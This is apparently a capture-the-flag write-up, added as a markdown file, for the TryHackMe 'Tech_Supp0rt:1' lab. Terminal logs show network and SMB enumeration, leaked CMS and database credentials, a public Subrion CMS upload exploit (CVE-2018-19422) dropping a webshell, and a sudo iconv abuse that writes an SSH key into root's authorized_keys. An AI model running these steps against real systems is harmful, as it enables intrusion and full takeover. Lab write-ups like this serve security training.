@@ -1,0 +1,355 @@
+## Nmap scan
+```bash
+┌──(defalt@kali)-[~/Documents/tryhackme/Tech_Supp0rt:1]
+└─$ nmap -sC -sV 10.10.168.200        
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-15 21:29 PDT
+Nmap scan report for 10.10.168.200
+Host is up (0.37s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
+|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
+|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
+80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-time: 
+|   date: 2022-04-16T04:29:37
+|_  start_date: N/A
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: techsupport
+|   NetBIOS computer name: TECHSUPPORT\x00
+|   Domain name: \x00
+|   FQDN: techsupport
+|_  System time: 2022-04-16T09:59:38+05:30
+|_clock-skew: mean: -1h50m00s, deviation: 3h10m30s, median: -1s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.93 seconds
+```
+## feroxbuster 
+```bash
+──(defalt@kali)-[~/Documents/tryhackme/Tech_Supp0rt:1]
+└─$ feroxbuster --collect-backups -e -u http://10.10.168.200/                             1 ⨯
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.6.4
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.168.200/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.6.4
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏦  Collect Backups       │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+```
+
+/test/ - hint
+/icon/ - 403 forbidden
+/wordpress/ -404 not found
+
+wpscan --url http://[ip]/wordpress/ -e u,vp,vt
+
+## smbmap 
+
+```bash
+┌──(defalt@kali)-[~/Documents/tryhackme/Tech_Supp0rt:1]
+└─$ smbmap -H 10.10.168.200
+[+] Guest session   	IP: 10.10.168.200:445	Name: 10.10.168.200                                     
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	print$                                            	NO ACCESS	Printer Drivers
+	websvr                                            	READ ONLY	
+	IPC$                                              	NO ACCESS	IPC Service (TechSupport server (Samba, Ubuntu))
+```
+## smb client 
+```bash
+┌──(defalt@kali)-[~/Documents/tryhackme/Tech_Supp0rt:1]
+└─$ smbclient \\\\10.10.168.200\\websvr  
+Enter WORKGROUP\defalt's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat May 29 00:17:38 2021
+  ..                                  D        0  Sat May 29 00:03:47 2021
+  enter.txt                           N      273  Sat May 29 00:17:38 2021
+
+		8460484 blocks of size 1024. 5698356 blocks available
+smb: \> get enter.txt
+getting file \enter.txt of size 273 as enter.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+smb: \> exit
+                                                                                               
+┌──(defalt@kali)-[~/Documents/tryhackme/Tech_Supp0rt:1]
+└─$ cat enter.txt
+GOALS
+=====
+1)Make fake popup and host it online on Digital Ocean server
+2)Fix subrion site, /subrion doesn't work, edit from panel
+3)Edit wordpress website
+
+IMP
+===
+Subrion creds
+|->admin:7sKvntXdPEJaxazce9PXi24****** [cooked with magical formula]
+Wordpress creds
+|->
+```
+## panel website
+
+cyber chef decode and login to admin (magic)
+
+exploit
+https://github.com/h3v0x/CVE-2018-19422-SubrionCMS-RCE
+
+CVE-2018-19422-SubrionCMS-RCE
+
+```bash
+┌──(defalt@kali)-[~/Documents/tryhackme/Tech_Supp0rt:1/CVE-2018-19422-SubrionCMS-RCE]
+└─$ python3 SubrionRCE.py -u http://10.10.168.200/subrion/panel/ -l admin -p Scam2021
+[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 
+
+[+] Trying to connect to: http://10.10.168.200/subrion/panel/
+[+] Success!
+[+] Got CSRF token: sRY9GS572zbGcZo8uzRpF49eoXhYbDTO9LZfOdYx
+[+] Trying to log in...
+[+] Login Successful!
+
+[+] Generating random name for Webshell...
+[+] Generated webshell name: eerqehzwsunpqxn
+
+[+] Trying to Upload Webshell..
+[+] Upload Success... Webshell path: http://10.10.168.200/subrion/panel/uploads/eerqehzwsunpqxn.phar 
+
+$ whoami
+www-data
+```
+
+## wp-config
+```bash
+$ ls -la /home
+total 12
+drwxr-xr-x  3 root     root     4096 May 28  2021 .
+drwxr-xr-x 23 root     root     4096 May 28  2021 ..
+drwxr-xr-x  4 scamsite scamsite 4096 May 29  2021 scamsite
+
+$ ls -la /var/www/html/wordpress/
+total 220
+drwxr-xr-x  5 www-data www-data  4096 May 29  2021 .
+drwxr-xr-x  5 root     root      4096 May 29  2021 ..
+-rw-r--r--  1 www-data www-data   543 May 29  2021 .htaccess
+-rwxr-xr-x  1 www-data www-data   405 Feb  6  2020 index.php
+-rwxr-xr-x  1 www-data www-data 19915 Jan  1  2021 license.txt
+-rwxr-xr-x  1 www-data www-data  7345 Dec 30  2020 readme.html
+-rwxr-xr-x  1 www-data www-data  7165 Jan 21  2021 wp-activate.php
+drwxr-xr-x  9 www-data www-data  4096 May 13  2021 wp-admin
+-rwxr-xr-x  1 www-data www-data   351 Feb  6  2020 wp-blog-header.php
+-rwxr-xr-x  1 www-data www-data  2328 Feb 17  2021 wp-comments-post.php
+-rwxr-xr-x  1 www-data www-data  2992 May 29  2021 wp-config.php
+drwxr-xr-x  6 www-data www-data  4096 May 29  2021 wp-content
+-rwxr-xr-x  1 www-data www-data  3939 Jul 31  2020 wp-cron.php
+drwxr-xr-x 25 www-data www-data 12288 May 13  2021 wp-includes
+-rwxr-xr-x  1 www-data www-data  2496 Feb  6  2020 wp-links-opml.php
+-rwxr-xr-x  1 www-data www-data  3313 Jan 11  2021 wp-load.php
+-rwxr-xr-x  1 www-data www-data 44994 Apr  5  2021 wp-login.php
+-rwxr-xr-x  1 www-data www-data  8509 Apr 14  2020 wp-mail.php
+-rwxr-xr-x  1 www-data www-data 21125 Feb  2  2021 wp-settings.php
+-rwxr-xr-x  1 www-data www-data 31328 Jan 28  2021 wp-signup.php
+-rwxr-xr-x  1 www-data www-data  4747 Oct  9  2020 wp-trackback.php
+-rwxr-xr-x  1 www-data www-data  3236 Jun  9  2020 xmlrpc.php
+
+$ cat /var/www/html/wordpress/wp-config.php
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wpdb' );
+
+/** MySQL database username */
+define( 'DB_USER', 'support' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define( 'AUTH_KEY',         'put your unique phrase here' );
+define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
+define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
+define( 'NONCE_KEY',        'put your unique phrase here' );
+define( 'AUTH_SALT',        'put your unique phrase here' );
+define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
+define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
+define( 'NONCE_SALT',       'put your unique phrase here' );
+
+/**#@-*/
+
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the documentation.
+ *
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */
+define( 'WP_DEBUG', false );
+
+/* That's all, stop editing! Happy publishing. */
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+	define( 'ABSPATH', __DIR__ . '/wordpress/' );
+}
+
+define('WP_HOME', '/wordpress/index.php');
+define('WP_SITEURL', '/wordpress/');
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
+
+``` 
+## ssh session to scamsite user
+
+```bash
+┌──(defalt@kali)-[~/Documents/tryhackme/Tech_Supp0rt:1/CVE-2018-19422-SubrionCMS-RCE]
+└─$ ssh scamsite@10.10.168.200
+The authenticity of host '10.10.168.200 (10.10.168.200)' can't be established.
+ED25519 key fingerprint is SHA256:J/HR9GKX4ReRvs4I9fnMwmJrOTL5B3skZ4owxwxWoyM.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.168.200' (ED25519) to the list of known hosts.
+scamsite@10.10.168.200's password: 
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+120 packages can be updated.
+88 updates are security updates.
+
+
+Last login: Fri May 28 23:30:20 2021
+scamsite@TechSupport:~$ 
+```
+
+## sudo priv
+```bash
+scamsite@TechSupport:~$ sudo -l
+Matching Defaults entries for scamsite on TechSupport:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User scamsite may run the following commands on TechSupport:
+    (ALL) NOPASSWD: /usr/bin/iconv
+```
+## gtfo bins
+
+ssh-keygen
+
+LFILE=/root/.ssh/authorized_keys
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3Tg+rRazy0eWaLkFPOrPhaikrHn+mknip8P9i4yrqLKbmZlAJSB9GE82tuz3f9aNlW1iJywrDYsT52sbzWutT4He8M+j0xW6bLWH/Tc8enh6vrkK9+UdZtIO6/1IiQGLSLIzzP1L6fg9Iq4d7t/fdq85RXMn3dw53JDdjkeQUA3HqjMM8Q/+5Hbad8eT7WoJE3Tl0sxk3tz+gTvy6Jb2tsEEE6fXP+hMo+nuDB+9xSfjFLRLwJc8+tGE+KwhixF9dy4nVtXbXPsE995M3bOGRUm0rwpoJnBkBTaRWm5Heaadh93EG6Xm00Ox3v9Pr9ocxg7UzypgvnVo7SolcZ3y3pt4EV2Vfz2wDBS/jw9YhPfPh5SAiBDo/UcfGbV2YUckwE2sVXPkbImqSlGrHveJQfi2bhGCjpEDKnUJlp1kdCvbNggX003QMu6HGWowJ0nv+S3ZoKcAIUoC2090tdtURAYf1LSGZ0uWVfg09JxFhPvDHYJq/VLv3th0AeLzx9vc= defalt@kali
+" | sudo iconv -f 8859_1 -t 8859_1 -o "$LFILE"
+
+```bash
+┌──(defalt@kali)-[~/Documents/tryhackme/Tech_Supp0rt:1]
+└─$ ssh root@10.10.252.87 -i defalt 
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+120 packages can be updated.
+88 updates are security updates.
+
+
+Last login: Sun Nov 21 11:17:57 2021
+root@TechSupport:~# ls
+root.txt
+root@TechSupport:~# cat root.txt
+851b8233a8c09400ec30651bd1529bf1ed02790b  -
+root@TechSupport:~# 
+```
+
+```bash
+scamsite@TechSupport:~$ LFILE=/root/.ssh/authorized_keys
+scamsite@TechSupport:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3Tg+rRazy0eWaLkFPOrPhaikrHn+mknip8P9i4yrqLKbmZlAJSB9GE82tuz3f9aNlW1iJywrDYsT52sbzWutT4He8M+j0xW6bLWH/Tc8enh6vrkK9+UdZtIO6/1IiQGLSLIzzP1L6fg9Iq4d7t/fdq85RXMn3dw53JDdjkeQUA3HqjMM8Q/+5Hbad8eT7WoJE3Tl0sxk3tz+gTvy6Jb2tsEEE6fXP+hMo+nuDB+9xSfjFLRLwJc8+tGE+KwhixF9dy4nVtXbXPsE995M3bOGRUm0rwpoJnBkBTaRWm5Heaadh93EG6Xm00Ox3v9Pr9ocxg7UzypgvnVo7SolcZ3y3pt4EV2Vfz2wDBS/jw9YhPfPh5SAiBDo/UcfGbV2YUckwE2sVXPkbImqSlGrHveJQfi2bhGCjpEDKnUJlp1kdCvbNggX003QMu6HGWowJ0nv+S3ZoKcAIUoC2090tdtURAYf1LSGZ0uWVfg09JxFhPvDHYJq/VLv3th0AeLzx9vc= defalt@kali
+> " | sudo iconv -f 8859_1 -t 8859_1 "$LFILE"
+iconv: cannot open input file `/root/.ssh/authorized_keys': No such file or directory
+scamsite@TechSupport:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3Tg+rRazy0eWaLkFPOrPhaikrHn+mknip8P9i4yrqLKbmZlAJSB9GE82tuz3f9aNlW1iJywrDYsT52sbzWutT4He8M+j0xW6bLWH/Tc8enh6vrkK9+UdZtIO6/1IiQGLSLIzzP1L6fg9Iq4d7t/fdq85RXMn3dw53JDdjkeQUA3HqjMM8Q/+5Hbad8eT7WoJE3Tl0sxk3tz+gTvy6Jb2tsEEE6fXP+hMo+nuDB+9xSfjFLRLwJc8+tGE+KwhixF9dy4nVtXbXPsE995M3bOGRUm0rwpoJnBkBTaRWm5Heaadh93EG6Xm00Ox3v9Pr9ocxg7UzypgvnVo7SolcZ3y3pt4EV2Vfz2wDBS/jw9YhPfPh5SAiBDo/UcfGbV2YUckwE2sVXPkbImqSlGrHveJQfi2bhGCjpEDKnUJlp1kdCvbNggX003QMu6HGWowJ0nv+S3ZoKcAIUoC2090tdtURAYf1LSGZ0uWVfg09JxFhPvDHYJq/VLv3th0AeLzx9vc= defalt@kali
+" | sudo iconv -f 8859_1 -t 8859_1 -o "$LFILE"
+```
